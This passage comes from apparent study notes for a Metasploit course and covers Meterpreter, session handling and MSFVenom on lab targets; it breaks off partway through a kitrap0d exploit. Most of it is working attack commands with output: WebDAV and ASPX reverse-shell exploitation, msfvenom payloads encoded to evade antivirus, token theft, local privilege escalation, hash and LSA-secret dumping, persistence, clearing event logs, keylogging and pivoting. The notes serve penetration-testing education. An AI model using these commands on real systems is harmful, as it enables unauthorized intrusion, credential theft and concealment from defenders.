    - Example: Set up a Windows 7 VM vulnerable to MS17-010 to practice Meterpreter sessions.
    - Suggested VM: Metasploitable 3 or a Windows XP/7 VM with SMB enabled.
- **Backup Data**:
    - Export session-related data regularly:
        
        ```
        msf6 > db_export -f xml backup_$(date +%F).xml
        
        ```
        
- **Payload Stability**:
    - Use reliable payloads like Meterpreter for stable sessions.
    - Encode payloads to evade antivirus (from "7 MSF Encoders.pdf"):
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
        
        ```
        

### Next Steps

- **Explore Meterpreter**:
    - The document mentions Meterpreter as the next topic. Learn Meterpreter commands for post-exploitation:
        
        ```
        meterpreter > help
        
        ```
        
        - Common commands: `getuid`, `shell`, `upload`, `download`, `ps`, `migrate`.
    - Example: Dump credentials:
        
        ```
        meterpreter > run post/windows/gather/credentials/credential_collector
        
        ```
        
- **Automate Session Management**:
    - Use the `pentest` plugin (from "9 MSF Plugins.pdf") to automate tasks across multiple sessions:
        
        ```
        msf6 > multi_meter_cmd getuid
        
        ```
        
- **Pivot Through Sessions**:
    - Use Meterpreter to pivot to other network hosts:
        
        ```
        meterpreter > run post/windows/gather/arp_scanner
        
        ```
        
    - Explore plugins like `pentest.rb` for network discovery:
        
        ```
        msf6 > pivot_network_discover
        
        ```
        
- **Custom Scripts**:
    - Write Ruby scripts to automate session interactions (e.g., run a command across all Meterpreter sessions).
    - Example: [https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-modules.html](https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-modules.html)
- **Further Reading**:
    - Metasploit Sessions Guide: [https://docs.metasploit.com/docs/using-metasploit/basics/working-with-sessions.html](https://docs.metasploit.com/docs/using-metasploit/basics/working-with-sessions.html)
    - Meterpreter Documentation: [https://docs.metasploit.com/docs/using-metasploit/basics/meterpreter.html](https://docs.metasploit.com/docs/using-metasploit/basics/meterpreter.html)
    - Job Management: [https://docs.metasploit.com/docs/using-metasploit/advanced/jobs.html](https://docs.metasploit.com/docs/using-metasploit/advanced/jobs.html)

## 11. Meterpreter

**Focus**: Explores the Meterpreter payload, a versatile, extensible tool for post-exploitation. Details its in-memory operation, AES-encrypted communication, and capabilities like privilege escalation, credential dumping, and pivoting. Demonstrates practical use through scanning, exploitation, process migration, and privilege escalation on a target system.

### Key Points with Explanations

### Overview of Meterpreter

- **Definition**: Meterpreter is a multi-faceted, extensible payload that operates entirely in memory on the target host, using DLL injection to establish a stable, encrypted connection. It leaves minimal forensic traces on the hard drive, making it difficult to detect with traditional methods.
- **Purpose** (page 1):
    - **Post-Exploitation**: Enhances post-exploitation by providing tools for enumeration, privilege escalation, vulnerability research, persistence, and pivoting.
    - **Versatility**: Often called the "Swiss Army knife of pentesting" due to its comprehensive feature set.
    - **Key Capabilities**:
        - Enumerate system details (e.g., users, processes, network configurations).
        - Escalate privileges to gain higher access (e.g., SYSTEM).
        - Evade antivirus (AV) through in-memory execution and encoding (links to "7 MSF Encoders.pdf").
        - Establish persistent access across reboots.
        - Pivot to other systems in the network.
- **Key Features**:
    - **In-Memory Execution**: Runs without writing to disk, reducing forensic evidence.
    - **AES Encryption**: All communications (msfconsole v6) are encrypted for confidentiality (page 3).
    - **Extensibility**: New features can be loaded at runtime over the network without rebuilding (page 3).
    - **Channelized Communication**: Supports dedicated channels for tasks like spawning shells, ensuring encrypted traffic (page 3).
    - **Reflective DLL Injection**: Uses a reflective stub to load the Meterpreter DLL, enhancing stealth (page 1).

### Running Meterpreter

- **Selecting a Payload** (page 1):
    - Choose a Meterpreter payload from the `show payloads` output, matching the target OS and connection type (e.g., `windows/meterpreter/reverse_tcp` for Windows reverse TCP).
    - Example:
        
        ```
        msf6 > use exploit/windows/iis/iis_webdav_upload_asp
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > show payloads
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PAYLOAD windows/meterpreter/reverse_tcp
        
        ```
        
- **Execution Process** (page 1):
    1. **Initial Stager**: The target executes a stager (e.g., reverse TCP, bind) to initiate the connection.
    2. **Reflective DLL Loading**: The stager loads a reflective DLL, which handles injection into memory.
    3. **Core Initialization**: Meterpreter establishes an AES-encrypted link and sends a GET request to Metasploit.
    4. **Client Configuration**: Metasploit configures the client based on the GET request.
    5. **Extension Loading**: Loads core extensions (`stdapi`, `priv` if admin rights are available) over AES encryption.
- **Result**: A Meterpreter shell is opened, providing a command-line interface for post-exploitation.
    
    ```
    [*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030)
    meterpreter >
    
    ```
    

### Meterpreter Commands

- **Help Menu** (pages 1–2):
    - Run `help` to list available commands:
        
        ```
        meterpreter > help
        Core Commands
        =============
        Command       Description
        -------       -----------
        ?             Help menu
        background    Backgrounds the current session
        bg            Alias for background
        bgkill        Kills a background Meterpreter script
        bglist        Lists running background scripts
        bgrun         Executes a Meterpreter script as a background thread
        channel       Displays information or control active channels
        close         Closes a channel
        disable_unicode_encoding  Disables encoding of Unicode strings
        <SNIP>
        
        ```
        
    - **Key Commands**:
        - `background` (or `bg`): Backgrounds the session, returning to the `msfconsole` prompt (links to "10 MSF Sessions.pdf").
        - `getuid`: Displays the current user context.
        - `ps`: Lists running processes.
        - `steal_token <PID>`: Impersonates a user token from a process.
        - `hashdump`: Dumps password hashes (requires SYSTEM privileges).
        - `lsa_dump_sam`: Dumps SAM database hashes.
        - `lsa_dump_secrets`: Extracts LSA secrets (e.g., service account passwords).
- **Scripts and Extensions**:
    - Meterpreter supports Ruby scripts for automation (e.g., `bgrun` to run scripts in the background).
    - Extensions like `stdapi` (system interactions) and `priv` (privilege escalation) enhance functionality.

### Practical Application: Scanning and Exploitation

- **Scanning the Target** (page 3):
    - Use `db_nmap` to scan the target and store results in the database (links to "8 MSF Databases.pdf"):
        
        ```
        msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
        [*] Nmap: Starting Nmap 7.80
        [*] Nmap: PORT   STATE SERVICE VERSION
        [*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
        [*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        
        ```
        
    - View hosts and services:
        
        ```
        msf6 > hosts
        Hosts
        address      os_name  purpose  info
        10.10.10.15  Unknown  device
        
        msf6 > services
        Services
        host         port  proto  name  state  info
        10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
        
        ```
        
    - **Analysis**: Port 80 runs Microsoft IIS 6.0, with WebDAV enabled, indicating potential vulnerabilities (e.g., WebDAV upload exploits).
- **Exploiting the Target** (pages 5–6):
    - Search for a WebDAV exploit:
        
        ```
        msf6 > search iis_webdav_upload_asp
        Matching Modules
        #  Name                                       Disclosure Date  Rank
        0  exploit/windows/iis/iis_webdav_upload_asp  2004-10-26       great
        
        ```
        
    - Configure and run the exploit:
        
        ```
        msf6 > use exploit/windows/iis/iis_webdav_upload_asp
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
        [*] Started reverse TCP handler on 10.10.14.26:4444
        [*] Uploading 612435 bytes to /metasploit28857905.txt...
        [*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
        [*] Executing /metasploit28857905.asp...
        [*] Sending stage (175174 bytes) to 10.10.10.15
        [*] Deletion failed on /metasploit28857905.asp [403 Forbidden]
        [*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030)
        meterpreter >
        
        ```
        
    - **Forensic Note** (page 6):
        - The exploit uploads an ASP file (`metasploit28857905.asp`), which is executed to spawn Meterpreter.
        - Metasploit attempts to delete the file but fails (`403 Forbidden`), leaving a trace.
        - **Defender’s Perspective**: Monitor for files with patterns like `metasploit*.asp` to detect attacks.
        - **Attacker’s Perspective**: Manual cleanup or custom scripts can reduce traces.

### Post-Exploitation: Process Migration

- **Issue**: Initial Meterpreter session runs with limited privileges, causing an "Access denied" error:
    
    ```
    meterpreter > getuid
    [*] 1055: Operation failed: Access is denied.
    
    ```
    
- **Solution**: Migrate to a process with higher privileges (page 6):
    - List processes:
        
        ```
        meterpreter > ps
        Process List
        PID   PPID  Name                Arch  Session  User                            Path
        0     0     [System Process]
        4     0     System
        1836  592   wmiprvse.exe        x86   0        NT AUTHORITY\\NETWORK SERVICE    C:\\WINDOWS\\system32\\...
        3552  1460  w3wp.exe            x86   0        NT AUTHORITY\\NETWORK SERVICE    C:\\windows\\system32\\...
        <SNIP>
        
        ```
        
    - Steal a token from a privileged process (e.g., `wmiprvse.exe`, PID 1836):
        
        ```
        meterpreter > steal_token 1836
        Stolen token with username: NT AUTHORITY\\NETWORK SERVICE
        meterpreter > getuid
        Server username: NT AUTHORITY\\NETWORK SERVICE
        
        ```
        
    - **Result**: The session now runs as `NT AUTHORITY\\NETWORK SERVICE`, providing more access but not full SYSTEM privileges.

### Post-Exploitation: Interacting with the Target

- **File System Exploration** (page 7):
    - Navigate the file system:
        
        ```
        meterpreter > dir c:\\inetpub
        dir
        Directory of c:\\inetpub
        04/12/2017 05:17 PM    <DIR>          AdminScripts
        04/12/2017 05:17 PM    <DIR>          wwwroot
        09/03/2020 01:10 PM    <DIR>          metasploit28857905.asp
        
        ```
        
    - Attempt to access `AdminScripts`:
        
        ```
        meterpreter > cd AdminScripts
        Access is denied.
        
        ```
        
    - **Issue**: Lack of permissions prevents access to potentially sensitive directories.

### Post-Exploitation: Privilege Escalation

- **Strategy**: Use a local exploit suggester to identify privilege escalation vulnerabilities (page 8):
    - Background the session:
        
        ```
        meterpreter > bg
        Background session 1? [y/N] y
        msf6 exploit(windows/iis/iis_webdav_upload_asp) >
        
        ```
        
    - Search for the suggester module:
        
        ```
        msf6 > search local_exploit_suggester
        Matching Modules
        #  Name                                     Rank    Check  Description
        0  post/multi/recon/local_exploit_suggester normal  No     Multi Recon
        
        ```
        
    - Configure and run:
        
        ```
        msf6 > use post/multi/recon/local_exploit_suggester
        msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
        msf6 post(multi/recon/local_exploit_suggester) > run
        [*] 10.10.10.15 - 34 exploit checks are being tried...
        [*] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
        
        ```
        
- **Exploit MS15-051** (pages 9–10):
    - Select the exploit:
        
        ```
        msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
        msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
        msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
        msf6 exploit(windows/local/ms15_051_client_copy_image) > run
        [*] Started reverse TCP handler on 10.10.14.26:4444
        [*] Launching notepad to host the exploit...
        [*] Reflectively injecting the exploit DLL into 844...
        [*] Exploit finished, wait for (hopefully privileged) payload execution to complete.
        [*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031)
        meterpreter > getuid
        Server username: NT AUTHORITY\\SYSTEM
        
        ```
        
    - **Result**: A new Meterpreter session with SYSTEM privileges, granting full control.

### Post-Exploitation: Credential Harvesting

- **Dumping Hashes** (page 10):
    - Use `hashdump` to extract password hashes:
        
        ```
        meterpreter > hashdump
        Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
        ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd709:::
        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        <SNIP>
        
        ```
        
    - **Format**: `Username:RID:LM_Hash:NTLM_Hash:::`
    - **Use Case**: Crack hashes offline using tools like Hashcat:
        
        ```
        hashcat -m 1000 -a 0 d6908f022af0373e9e21b8a241c86dca wordlist.txt
        
        ```
        
- **Dumping SAM Database** (pages 10–11):
    - Use `lsa_dump_sam`:
        
        ```
        meterpreter > lsa_dump_sam
        [*] Running as SYSTEM
        [*] Dumping SAM
        Domain : GRANNY
        Syskey : 11b5033b62d3d2d6bb80a0d45ea88bfb
        User : Administrator
        Hash LM : c74761604a24f0dfd0a9ba2c30e462cf
        Hash NTLM: d6908f022af0373e9e21b8a241c86dca
        <SNIP>
        
        ```
        
- **Dumping LSA Secrets** (page 11):
    - Use `lsa_dump_secrets` to extract sensitive data (e.g., service account passwords):
        
        ```
        meterpreter > lsa_dump_secrets
        [*] Running as SYSTEM
        [*] Dumping LSA secrets
        Domain : GRANNY
        Secret : aspnet_WP_PASSWORD
        cur/text: Q5C'181g16D'=F
        
        ```
        
    - **Additional Secrets** (page 12):
        - `DPAPI_SYSTEM`: Machine and user keys for decrypting protected data.
        - Service account credentials (page 13):
            
            ```
            Secret : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\\NetworkService
            Secret : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\\LocalService
            
            ```
            
    - **Use Case**: Use credentials for lateral movement or to access other systems.

### Pivoting Potential

- **Context** (page 13):
    - With SYSTEM access and harvested credentials, Meterpreter can pivot to other systems in the network if the security posture is weak.
    - Example: Use stolen credentials to authenticate to another host:
        
        ```
        msf6 > use auxiliary/scanner/smb/smb_login
        msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.16
        msf6 auxiliary(scanner/smb/smb_login) > set SMBUser Administrator
        msf6 auxiliary(scanner/smb/smb_login) > set SMBPass d6908f022af0373e9e21b8a241c86dca
        msf6 auxiliary(scanner/smb/smb_login) > run
        
        ```
        
    - Set up a route through the Meterpreter session:
        
        ```
        meterpreter > run autoroute -s 10.10.10.0/24
        [*] Adding route to 10.10.10.0/24 via session 2
        msf6 > route print
        
        ```
        
    - **Benefit**: Access internal resources without direct network connectivity.

### Integration with Previous Notes

- **Sessions ("10 MSF Sessions.pdf")**:
    - Meterpreter creates sessions that can be backgrounded and managed:
        
        ```
        meterpreter > background
        msf6 > sessions
        Active sessions
        Id  Type                   Information                            Connection
        1   meterpreter x86/windows NT AUTHORITY\\NETWORK SERVICE @ GRANNY 10.10.14.26:4444 -> 10.10.10.15:1030
        2   meterpreter x86/windows NT AUTHORITY\\SYSTEM @ GRANNY         10.10.14.26:4444 -> 10.10.10.15:1031
        
        ```
        
    - Run post-exploitation modules on sessions:
        
        ```
        msf6 > use post/windows/gather/credentials/credential_collector
        msf6 post(windows/gather/credentials/credential_collector) > set SESSION 2
        msf6 post(windows/gather/credentials/credential_collector) > run
        
        ```
        
- **Encoders ("7 MSF Encoders.pdf")**:
    - Encode Meterpreter payloads to evade AV:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
        
        ```
        
    - Use with exploits to ensure stealth:
        
        ```
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PAYLOAD windows/meterpreter/reverse_tcp
        msf6 exploit(windows/iis/iis_webdav_upload_asp) > set Encoder x86/shikata_ga_nai
        
        ```
        
- **Databases ("8 MSF Databases.pdf")**:
    - Store scan and credential data:
        
        ```
        msf6 > creds
        Credentials
        host         service  user           password
        10.10.10.15  sam      Administrator  d6908f022af0373e9e21b8a241c86dca
        10.10.10.15  lsa      aspnet         Q5C'181g16D'=F
        
        ```
        
    - Export for reporting:
        
        ```
        msf6 > db_export -f xml Granny_2025-05-13.xml
        
        ```
        
- **Plugins ("9 MSF Plugins.pdf")**:
    - Use `pentest` plugin to automate Meterpreter tasks:
        
        ```
        msf6 > load pentest
        msf6 > multi_meter_cmd hashdump
        [*] Running hashdump on all Meterpreter sessions...
        
        ```
        
    - Use `nessus` to identify vulnerabilities for Meterpreter exploitation:
        
        ```
        msf6 > load nessus
        msf6 > nessus_scan_new 10.10.10.15
        
        ```
        

### Common Issues and Troubleshooting

- **Session Dies**:
    - **Cause**: Network issues, AV detection, or process termination.
    - **Solution**:
        - Verify session status:
            
            ```
            msf6 > sessions
            
            ```
            
        - Use persistence:
            
            ```
            meterpreter > run persistence -U -i 30 -p 4444 -r 10.10.14.26
            
            ```
            
        - Switch to a more stable payload (e.g., `windows/meterpreter/reverse_https`).
- **File Traces** (page 6):
    - **Issue**: Exploit leaves files (e.g., `metasploit28857905.asp`).
    - **Solution**:
        - Manually delete:
            
            ```
            meterpreter > shell
            del c:\\inetpub\\metasploit28857905.asp
            
            ```
            
        - Use stageless payloads for stealth (referenced on page 1).
- **Access Denied**:
    - **Solution**:
        - Migrate to a privileged process:
            
            ```
            meterpreter > ps
            meterpreter > steal_token <PID>
            
            ```
            
        - Run privilege escalation exploits:
            
            ```
            msf6 > use exploit/windows/local/ms15_051_client_copy_image
            
            ```
            
- **Exploit Fails**:
    - **Solution**:
        - Verify target compatibility:
            
            ```
            msf6 > check
            
            ```
            
        - Adjust payload options:
            
            ```
            msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
            msf6 > set LPORT 4445
            
            ```
            

### Ethical and Practical Notes

- **Ethical Use**:
    - Meterpreter provides deep system access. Use only in authorized environments (e.g., penetration tests, CTFs like Hack The Box).
    - Secure harvested credentials and delete temporary files to avoid misuse.
- **Lab Setup**:
    - Practice on vulnerable VMs (e.g., Metasploitable 3, Windows XP/2003 with IIS 6.0).
    - Example: Set up a Windows 2003 VM with WebDAV enabled to replicate the exploit.
    - Platforms: TryHackMe, Hack The Box, or local VMs via VirtualBox.
- **Forensic Awareness**:
    - Defenders can detect Meterpreter by monitoring memory, network traffic, or file artifacts (e.g., `metasploit*.asp`).
    - Attackers should use stageless payloads and cleanup scripts:
        
        ```
        meterpreter > clearev
        
        ```
        
- **Persistence**:
    - Establish persistence for long-term access:
        
        ```
        meterpreter > run persistence -U -i 30 -p 4444 -r 10.10.14.26
        
        ```
        
    - Monitor for detection by AV or EDR solutions.

### Next Steps

- **Advanced Meterpreter Features**:
    - Explore additional commands:
        
        ```
        meterpreter > screenshot
        meterpreter > keyscan_start
        meterpreter > webcam_snap
        
        ```
        
    - Use scripts for automation:
        
        ```
        meterpreter > run post/windows/gather/checkvm
        
        ```
        
- **Pivoting and Lateral Movement**:
    - Set up routes for network pivoting:
        
        ```
        meterpreter > run autoroute -s 10.10.10.0/24
        
        ```
        
    - Use `portfwd` to access internal services:
        
        ```
        meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.16
        
        ```
        
- **Custom Scripts**:
    - Write Ruby scripts to automate Meterpreter tasks:
        
        ```
        msf6 > use post/windows/manage/migrate
        msf6 post(windows/manage/migrate) > set SESSION 1
        msf6 post(windows/manage/migrate) > run
        
        ```
        
    - Reference: [https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-meterpreter-scripts.html](https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-meterpreter-scripts.html)
- **Integration with Other Tools**:
    - Use Mimikatz via Meterpreter:
        
        ```
        meterpreter > load mimikatz
        meterpreter > kerberos
        
        ```
        
    - Export hashes to crack with John the Ripper:
        
        ```
        john --format=NT hashes.txt
        
        ```
        
- **Further Reading**:
    - Meterpreter Basics: [https://docs.metasploit.com/docs/using-metasploit/basics/meterpreter.html](https://docs.metasploit.com/docs/using-metasploit/basics/meterpreter.html)
    - Privilege Escalation: [https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)
    - Pivoting: [https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

### Quick Reference Summary

- **Purpose**: Post-exploitation payload for enumeration, privilege escalation, credential harvesting, and pivoting.
- **Key Features**:
    - In-memory execution, AES encryption, reflective DLL injection.
    - Extensible with runtime-loaded extensions (`stdapi`, `priv`).
    - Channelized communication for tasks like shell spawning.
- **Commands**:
    - `help`: List commands.
    - `getuid`: Show current user.
    - `ps`, `steal_token`: Process migration.
    - `hashdump`, `lsa_dump_sam`, `lsa_dump_secrets`: Credential harvesting.
    - `background`: Return to `msfconsole`.
- **Workflow**:
    1. Scan target (`db_nmap`).
    2. Exploit vulnerability (e.g., `iis_webdav_upload_asp`).
    3. Gain Meterpreter session.
    4. Migrate processes (`steal_token`).
    5. Escalate privileges (`local_exploit_suggester`).
    6. Harvest credentials (`hashdump`, `lsa_dump_secrets`).
    7. Pivot to other systems (`autoroute`).
- **Best Practices**:
    - Use encoded payloads for AV evasion.
    - Clean up file traces (e.g., `metasploit*.asp`).
    - Store data in the database.
    - Test in a lab environment.
- **Limitations**:
    - Initial sessions may have limited privileges.
    - File artifacts can be detected if cleanup fails.
    - Requires SYSTEM privileges for advanced features (e.g., `hashdump`).

---

## 13. MSFVenom

**Focus**: Explores MSFVenom, the successor to MSFPayload and MSFEncode, used to generate customizable, hard-to-detect payloads for various architectures and operating systems. Details its use in crafting a reverse shell payload for a vulnerable FTP and web server, followed by privilege escalation using Meterpreter and the Local Exploit Suggester.

### Key Points with Explanations

### Overview of MSFVenom

- **Definition** (page 1): MSFVenom is a standalone tool combining the functionality of MSFPayload (shellcode generation) and MSFEncode (encoding for bad character removal and AV evasion). It creates payloads tailored for specific target architectures, operating systems, and exploitation scenarios.
- **Purpose**:
    - **Payload Generation**: Quickly craft payloads for exploits, supporting multiple formats (e.g., `.exe`, `.aspx`, `.php`) and architectures (e.g., x86, x64).
    - **Customization**: Allows specification of options like LHOST, LPORT, encoders, and bad characters to ensure compatibility and stealth.
    - **AV Evasion**: Applies encoding schemes to bypass older antivirus (AV) and intrusion detection/prevention systems (IDS/IPS), though modern AV uses heuristic analysis, machine learning, and deep packet inspection, making evasion more challenging.
    - **Error Prevention**: Removes bad characters from shellcode to prevent runtime errors.
- **Historical Context** (page 1):
    - **MSFPayload**: Generated shellcode for specific architectures and OS releases.
    - **MSFEncode**: Encoded shellcode to remove bad characters and evade AV/IDS.
    - **MSFVenom**: Merges both tools, streamlining the process and improving usability.
- **Challenges** (page 1):
    - Modern AV systems detect payloads with high accuracy (e.g., a simple payload scored 52/65 hits on VirusTotal).
    - Encoding alone is insufficient against heuristic-based detection, requiring advanced techniques like stageless payloads or custom obfuscation (links to "7 MSF Encoders.pdf").

### Scenario Setup

- **Hypothetical Scenario** (page 1):
    - **Target**: A Windows machine (10.10.10.5) with:
        - An open FTP port (21) allowing anonymous login.
        - A web server (IIS 7.5) on port 80, serving files from the FTP root directory in the `/uploads` directory.
        - No restrictions on executing uploaded files via the web service.
    - **Attack Plan**:
        1. Upload a malicious `.aspx` payload via FTP.
        2. Access the payload via the web service ([http://10.10.10.5/reverse_shell.aspx](http://10.10.10.5/reverse_shell.aspx)) to trigger a reverse shell.
        3. Use Meterpreter for post-exploitation and escalate privileges.
- **Relevance**: This scenario mimics real-world misconfigurations (e.g., anonymous FTP access, lack of input validation) often found in legacy systems.

### Scanning the Target

- **Nmap Scan** (page 1):
    - Scan the target to identify services:
        
        ```
        K4y0x13@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     Microsoft FTPd
        80/tcp open  http    Microsoft IIS httpd 7.5
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        
        ```
        
    - **Findings**:
        - FTP (port 21): Microsoft FTPd, likely vulnerable to anonymous access.
        - HTTP (port 80): IIS 7.5, potentially serving FTP-uploaded files.
- **FTP Anonymous Access** (page 2):
    - Connect to FTP with anonymous credentials:
        
        ```
        K4y0x13@htb[/htb]$ ftp 10.10.10.5
        Connected to 10.10.10.5.
        220 Microsoft FTP Service
        Name (10.10.10.5:root): anonymous
        331 Anonymous access allowed, send identity (e-mail name) as password.
        Password: ******
        230 User logged in.
        ftp> ls
        200 PORT command successful.
        125 Data connection already open; Transfer starting.
        03-18-17 02:06AM <DIR> aspnet_client
        03-17-17 05:37PM 689 iisstart.htm
        03-17-17 05:37PM 184946 welcome.png
        226 Transfer complete.
        
        ```
        
    - **Analysis**:
        - Anonymous login succeeds, allowing file uploads.
        - Presence of `aspnet_client` directory suggests the server supports [ASP.NET](http://asp.net/), enabling `.aspx` payloads.

### Generating the Payload

- **MSFVenom Command** (page 2):
    - Generate an `.aspx` reverse Meterpreter payload:
        
        ```
        K4y0x13@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
        [-] No arch selected, selecting arch: x86 from the payload
        No encoder or badchars specified, outputting raw payload
        Payload size: 341 bytes
        Final size of aspx file: 2819 bytes
        
        ```
        
    - **Breakdown**:
        - `p windows/meterpreter/reverse_tcp`: Specifies a Windows Meterpreter reverse TCP payload.
        - `LHOST=10.10.14.5`: Attacker’s IP address for the reverse connection.
        - `LPORT=1337`: Port for the reverse connection.
        - `f aspx`: Output format ([ASP.NET](http://asp.net/) executable).
        - `> reverse_shell.aspx`: Saves the payload to a file.
    - **Output**:
        - A 2819-byte `.aspx` file is created, containing the Meterpreter shellcode.
        - No encoder is used, producing a raw payload (vulnerable to AV detection).
    - **List Files**:
        
        ```
        K4y0x13@htb[/htb]$ ls
        Desktop Documents Downloads my_data Postman PyCharmProjects reverse_shell.aspx Templates
        
        ```
        
        - Confirms `reverse_shell.aspx` is ready for upload.

### Setting Up the Listener

- **Multi/Handler** (page 3):
    - Configure Metasploit’s `multi/handler` to catch the reverse connection:
        
        ```
        K4y0x13@htb[/htb]$ msfconsole -q
        msf6 > use multi/handler
        msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > set LHOST 10.10.14.5
        LHOST => 10.10.14.5
        msf6 exploit(multi/handler) > set LPORT 1337
        LPORT => 1337
        msf6 exploit(multi/handler) > run
        [*] Started reverse TCP handler on 10.10.14.5:1337
        
        ```
        
    - **Purpose**: Listens for the reverse Meterpreter connection when the payload is executed.
- **Integration with Meterpreter** (links to "11 Meterpreter.pdf"):
    - The `multi/handler` module is designed to handle Meterpreter sessions, ensuring compatibility with the generated payload.

### Executing the Payload

- **Uploading the Payload**:
    - Upload `reverse_shell.aspx` to the FTP server (not shown but implied):
        
        ```
        ftp> put reverse_shell.aspx
        
        ```
        
- **Triggering the Payload** (page 3):
    - Access the payload via the web service:
        
        ```
        <http://10.10.10.5/reverse_shell.aspx>
        
        ```
        
    - **Behavior**:
        - The web page appears blank (no HTML in the payload).
        - The `.aspx` file executes in the background, initiating a reverse connection.
- **Meterpreter Session** (page 4):
    - The listener catches the connection:
        
        ```
        [*] Started reverse TCP handler on 10.10.14.5:1337
        [*] Sending stage (176195 bytes) to 10.10.10.5
        [*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:3
        meterpreter > getuid
        Server username: IIS APPPOOL\\Web
        [*] 10.10.10.5 - Meterpreter session 1 closed. Reason: Died
        
        ```
        
    - **Analysis**:
        - A Meterpreter session is established with the `IIS APPPOOL\\Web` user, which has limited privileges.
        - The session dies frequently, likely due to instability or AV detection.
- **Mitigation for Session Instability** (page 4):
    - **Encoding**: Apply an encoder to stabilize the payload and improve AV evasion:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -e x86/shikata_ga_nai -i 5 > reverse_shell.aspx
        
        ```
        
        - `e x86/shikata_ga_nai`: Uses the Shikata Ga Nai encoder (links to "7 MSF Encoders.pdf").
        - `i 5`: Applies five encoding iterations.
    - **Benefit**: Reduces runtime errors and may bypass older AV systems, though modern AV requires advanced obfuscation.

### Privilege Escalation

- **Issue**: The `IIS APPPOOL\\Web` user has limited permissions, restricting post-exploitation capabilities.
- **Solution**: Use the `local_exploit_suggester` module to identify privilege escalation vulnerabilities (page 4).
- **System Information**:
    - Run `sysinfo` to confirm architecture:
        
        ```
        meterpreter > sysinfo
        Computer: GRANNY
        OS: Windows (x86)
        
        ```
        
        - Confirms a 32-bit (x86) Windows system, guiding exploit selection.
- **Searching for Local Exploit Suggester** (page 5):
    - Search for the module:
        
        ```
        msf6 > search local_exploit_suggester
        Matching Modules
        #  Name                                     Rank    Check  Description
        2376 post/multi/recon/local_exploit_suggester normal  No     Multi Recon
        
        ```
        
    - Configure and run:
        
        ```
        msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
        msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
        session => 2
        msf6 post(multi/recon/local_exploit_suggester) > run
        [*] 10.10.10.5 - Collecting local exploits for x86/windows...
        [*] 10.10.10.5 - 31 exploit checks are being tried...
        [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable
        [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated
        [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable
        <SNIP>
        
        ```
        
    - **Results**: Multiple potential exploits, including `bypassuac_eventvwr` and `ms10_015_kitrap0d`.
- **Testing Exploits** (page 5):
    - **BypassUAC (bypassuac_eventvwr)**:
        - Fails because `IIS APPPOOL\\Web` is not in the Administrators group.
    - **MS10-015 Kitrap0d**:
        - Selected as the next option due to its applicability to x86 Windows systems.
- **Running MS10-015 Kitrap0d** (pages 6–7):
    - Configure the exploit:
        
        ```
        msf6 exploit(multi/handler) > search kitrap0d
        Matching Modules
        #  Name                                     Disclosure Date  Rank    Check  Description
        0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great   Yes    Windows SYS
        msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
        msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
        SESSION => 3
